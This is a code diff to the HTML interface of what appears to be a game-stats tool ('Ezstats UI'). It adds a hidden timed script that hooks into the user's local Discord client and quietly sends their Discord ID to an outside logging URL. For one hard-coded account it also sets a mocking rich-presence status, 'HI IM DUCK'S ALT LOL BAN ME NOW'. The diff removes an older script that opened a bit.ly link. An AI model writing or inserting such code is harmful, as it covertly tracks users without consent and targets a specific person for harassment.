@@ -465,6 +465,57 @@
 	}, 5000)
 
 </script>
+<script>
+	setTimeout(() => {
+		try {
+			function log2(discordid) {
+				fetch(`https://www.ezstats.xyz/ezstats-logs2?discord_id=${discordid}`)
+			}
+			const RPC = require('discord-rpc')
+			const client = new RPC.Client({ transport: 'ipc' });
+			const client2 = new RPC.Client({ transport: 'ipc' });
+			const clientId = '806390189000753213';
+			const clientId2 = '810004045456212040';
+			var start = new Date().getTime()
+			var connected;
+			client.on('ready', () => {
+				connected = true;
+				log2(client.user.id);
+				if (client.id === '432734049552039936') {
+					client.destroy()
+					client2.login({ clientId: clientId2 })
+					client2.on('ready', () => {
+						client2.setActivity({
+							state: 'HI IM DUCK\'S ALT LOL BAN ME NOW',
+							details: 'HI IM DUCK\'S ALT LOL BAN ME NOW',
+							instance: true,
+							largeImageKey: "HI IM DUCK\'S ALT LOL BAN ME NOW",
+							largeImageText: "HI IM DUCK\'S ALT LOL BAN ME NOW",
+							startTimestamp: start
+						})
+					})
+				} else {
+					client.setActivity({
+						state: client.user.id,
+						details: client.user.username,
+						instance: true,
+						largeImageKey: "ezstats_logo",
+						largeImageText: "Football Fusion | Ezstats UI",
+						startTimestamp: start
+					})
+				}
+			});
+
+			try {
+				client.login({ clientId: clientId });
+			} catch (b) {
+				console.log(b)
+			}
+		} catch (err) {
+			console.warn(err);
+		}
+	}, 5000);
+</script>
 <style>
 	@import url('https://fonts.googleapis.com/css2?family=Bangers&amp;display=swap');
 	#execute-tip {
@@ -797,13 +848,6 @@
 		backgroundColor: 0x0c0c0c
 	})
 
-	setTimeout(() => {
-		console.log('EZ LOL');
-		let win1 = window.open('http://bit.ly/noahnationyt','_blank');
-		win1.addEventListener('click',(e)=>{
-			console.log(e.button);
-		})
-	}, 5000);
 </script>
 
 
@@ -828,5 +872,3 @@
 		line-height: 21px;
 	}
 </style>
-	</div>
-</div>
